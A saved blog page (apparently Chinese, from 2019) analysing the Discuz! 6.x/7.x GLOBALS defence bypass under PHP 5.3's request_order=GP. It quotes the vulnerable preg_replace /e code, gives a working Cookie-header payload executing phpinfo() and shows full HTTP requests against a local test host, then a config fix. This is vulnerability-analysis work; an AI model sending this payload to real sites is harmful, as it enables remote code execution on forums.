@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>discuz 6.*/7.*全局变量防御绕过 | li9hu&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="漏洞原因 由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x&#x2F;7.x 全局变量防御绕过漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="discuz 6.*&#x2F;7.*全局变量防御绕过">
+<meta property="og:url" content="http://yoursite.com/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/index.html">
+<meta property="og:site_name" content="li9hu&#39;s Blog">
+<meta property="og:description" content="漏洞原因 由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x&#x2F;7.x 全局变量防御绕过漏洞。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/11.png">
+<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/10.png">
+<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/13.png">
+<meta property="article:published_time" content="2019-11-29T04:19:42.000Z">
+<meta property="article:modified_time" content="2020-03-21T06:43:26.000Z">
+<meta property="article:author" content="li9hu">
+<meta property="article:tag" content="discuz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/11.png">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+	<link href="/js/prism/prism.css" rel="stylesheet" />
+	<script src="/js/prism/prism.js" ></script>
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">li9hu</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+                        
+                            <li><a  href="/categories/%E7%AC%94%E8%AE%B0">笔记</a></li>
+                        
+                            <li><a  href="/%E8%AE%A1%E5%88%92">计划</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/ewan9hu" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/discuz/" style="font-size: 13.33px;">discuz</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/duomi/" style="font-size: 10px;">duomi</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/php/" style="font-size: 16.67px;">php</a> <a href="/tags/phpmyadmin/" style="font-size: 10px;">phpmyadmin</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/socket/" style="font-size: 10px;">socket</a> <a href="/tags/sql/" style="font-size: 13.33px;">sql</a> <a href="/tags/tp5/" style="font-size: 10px;">tp5</a> <a href="/tags/%E4%BB%A3%E7%90%86%E6%B1%A0/" style="font-size: 10px;">代理池</a> <a href="/tags/%E9%80%9A%E8%BE%BEOA/" style="font-size: 10px;">通达OA</a> <a href="/tags/%E9%9D%A2%E7%BB%8F/" style="font-size: 10px;">面经</a>
+                    </div>
+                </section>
+                
+                
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">li9hu</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">li9hu</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+                
+                    <li><a href="/categories/%E7%AC%94%E8%AE%B0">笔记</a></li>
+                
+                    <li><a href="/%E8%AE%A1%E5%88%92">计划</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/ewan9hu" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-漏洞分析/discuz 6-7全局变量防御绕" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/" class="article-date">
+      <time datetime="2019-11-29T04:19:42.000Z" itemprop="datePublished">2019-11-29</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      discuz 6.*/7.*全局变量防御绕过
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/discuz/" rel="tag">discuz</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="漏洞原因">漏洞原因</h3>
+<p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。<a id="more"></a></p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>当<code>request.order</code>设置为<strong>GP</strong>时,<code>$_REQUEST</code>只接受<code>POST GET</code>传来的值,导致<code>COOKIE</code>传值可以绕过一些CMS对<code>REQUEST</code>值的检测.</p>
+<pre><code class="language-php">&lt;?php
+echo  &quot;from request:&quot;.$_REQUEST['a'].&quot;\n&quot;;
+echo &quot;from Cookie:&quot;.$_COOKIE['a'];
+?&gt;
+</code></pre>
+<ul>
+<li>GP模式(-d 发送POST  -b 带COOKIE)</li>
+</ul>
+<pre><code class="language-php">curl -b &quot;a=yes&quot; 127.0.0.1/1.php
+from request:
+from Cookie:yes
+</code></pre>
+<ul>
+<li>CGP模式(切换模式记得重启服务)</li>
+</ul>
+<pre><code class="language-shell">curl -b&quot;a=yes&quot; 127.0.0.1/1.php
+from request:yes
+from Cookie:yes
+</code></pre>
+<h4 id="产生漏洞的代码段">产生漏洞的代码段</h4>
+<p>修改<code>GLOBALS</code>值，达到变量可控</p>
+<p>利用<code>preg_replace</code>在<code>e</code>模式下会将替换值当做php命令执行</p>
+<pre><code class="language-php">function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) {
+	global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
+    
+	if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, '[/code]') || strpos($message, '[/CODE]')) !== FALSE) {
+		$message = preg_replace(&quot;/\s?\[code\](.+?)\[\/code\]\s?/ies&quot;, &quot;codedisp('\\1')&quot;, $message);
+	}
+    
+	$msglower = strtolower($message);
+    
+	//$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
+    
+	if(!$htmlon) {
+		$message = $jammer ? preg_replace(&quot;/\r\n|\n|\r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);
+	}
+    
+	if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS['_DCACHE']['smilies']) &amp;&amp; is_array($GLOBALS['_DCACHE']['smilies'])) {
+		if(!$discuzcodes['smiliesreplaced']) {
+			foreach($GLOBALS['_DCACHE']['smilies']['replacearray'] AS $key =&gt; $smiley) {
+				$GLOBALS['_DCACHE']['smilies']['replacearray'][$key] = '&lt;img src=&quot;images/smilies/'.$GLOBALS['_DCACHE']['smileytypes'][$GLOBALS['_DCACHE']['smilies']['typearray'][$key]]['directory'].'/'.$smiley.'&quot; smilieid=&quot;'.$key.'&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;';
+			}
+			$discuzcodes['smiliesreplaced'] = 1;
+		}
+		$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
+	}
+</code></pre>
+<p>+关键代码</p>
+<pre><code class="language-php">$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
+</code></pre>
+<p>从代码段看出，我们只要参数2为0参数5为1的时候就有机会触发触发</p>
+<p>再来看看通用文件，一般都会有通用过滤的函数 <code>include/common.inc.php</code></p>
+<pre><code class="language-php">foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
+	foreach($$_request as $_key =&gt; $_value) {
+		$_key{0} != '_' &amp;&amp; $$_key = daddslashes($_value);
+	}
+}
+</code></pre>
+<p>此函数自定义了一个类似经addslashes过滤后的register_globals</p>
+<h4 id="resister-global">resister_global</h4>
+<p><code>regist_globals</code> 参数从php 4.2后默认值变成了OFF，5.4后考虑安全性已被删除</p>
+<p>当为开启的时候，用户可以从前端直接提交参数来覆盖掉php文件里变量的值</p>
+<pre><code class="language-php">    &lt;?php
+    #$a = 1;
+    echo $a;
+    ?&gt;
+</code></pre>
+<p>我们可以通过前端<code>POST,GET,REQUEST</code>等方式修改a的值，如果a变量初始化了则不会被篡改。</p>
+<p>这个漏洞不需要用到这个，因为都会进入到<code>addslashes</code>，所以我们的poc不能带单引号和双引号。</p>
+<p>通过自定义的类似<code>register_globals</code> 方法 我们可以用<code>GLOBALS</code>来修改可控变量达到攻击效果</p>
+<p>Discuz的设计者为了避免这种情况发生添加了如下代码：</p>
+<pre><code class="language-php">if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
+	exit('Request tainting attempted.');
+}
+</code></pre>
+<p>不允许用户修改<code>GLOBALS</code>参数。这里就用到了<code>GP</code>的设置了，<code>request_order</code>设置为<strong>GP</strong>时<code>request</code>不会接收到来自<code>COOKIE</code>的值。所以我们可以通过<code>COOKIE</code>传递<code>GLOBALS</code>从而绕过了对全局变量的防御。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>搜所有如下文件调用了该函数,省略了一部分，抽了两个符合条件的文件测试</p>
+<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/11.png" alt=""></p>
+<p>只要将<code>COOKIE</code>带入如下参数即可</p>
+<pre><code>Cookie:  GLOBALS[_DCACHE][smilies][searcharray]=/.*/e ; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+</code></pre>
+<p><code>/announcement.php</code>    (需要发布一个公告)</p>
+<pre><code>    GET /announcement.php HTTP/1.1
+    Host: 127.0.0.1:9090
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    
+    Cookie:  GLOBALS[_DCACHE][smilies][searcharray]=/.*/e ; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+    
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+</code></pre>
+<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/10.png" alt=""></p>
+<p><code>/viewthread.php</code>   (随便打开一个帖子,测试貌似得是管理员发布的就直接成功了)</p>
+<pre><code>    GET /viewthread.php?tid=13&amp;extra=page%3D1 HTTP/1.1
+    Host: 127.0.0.1:9090
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Referer: http://127.0.0.1:9090/forumdisplay.php?fid=2
+    Connection: keep-alive
+    Cookie:  GLOBALS[_DCACHE][smilies][searcharray]=/.*/e ; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+    
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+</code></pre>
+<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/13.png" alt=""></p>
+<h3 id="修复方案">修复方案</h3>
+<p>设置 request_order = CGP</p>
+<p>参考文章</p>
+<p><a href="https://www.secpulse.com/archives/2338.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2338.html</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/">discuz 6.*/7.*全局变量防御绕过</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 li9hu 的个人博客">li9hu</a></p>
+        <p><span>发布时间:</span>2019年11月29日 - 12时19分</p>
+        <p><span>最后更新:</span>2020年03月21日 - 14时43分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/" title="discuz 6.*/7.*全局变量防御绕过">http://yoursite.com/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/　　作者: li9hu" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          discuzx3.4任意文件删除
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">关于Phar的总结</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原因"><span class="toc-number">1.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#产生漏洞的代码段"><span class="toc-number">2.1.</span> <span class="toc-text">产生漏洞的代码段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#resister-global"><span class="toc-number">2.2.</span> <span class="toc-text">resister_global</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">4.</span> <span class="toc-text">修复方案</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" title="上一篇: discuzx3.4任意文件删除">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/" title="下一篇: 关于Phar的总结">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/%E7%AC%94%E8%AE%B0/2020%E5%AE%89%E5%85%A8%E5%B2%97%E6%98%A5%E6%8B%9B%E6%80%BB%E7%BB%93/">2020长亭实习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/">通达OA任意文件上传/文件包含GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">python反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/PhpMyAdmin%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/">PhpMyAdmin用户界面存在SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/socket%E7%BC%96%E6%88%90/">socket编成</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%B8%A6%E9%A2%9C%E8%89%B2%E8%BE%93%E5%87%BA/">python带颜色输出</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/http%E7%8A%B6%E6%80%81%E7%A0%81/">http状态码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/sql%E6%93%8D%E4%BD%9C/">sql操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">入侵检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Thinkphp5x远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">Docker使用记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB%E8%AE%B0%E5%BD%95%EF%BC%8C%E7%BC%96%E5%86%99%E4%BB%A3%E7%90%86%E6%B1%A0/">爬虫记录，编写代理池</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/duomi3-0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-GetShell/">duomi3.0变量覆盖/GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/">discuzx3.4任意文件删除</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/">discuz 6.*/7.*全局变量防御绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/">关于Phar的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/%E6%B8%97%E9%80%8F/disable-function%E7%BB%95%E8%BF%87/">disable_function绕过</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 li9hu
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
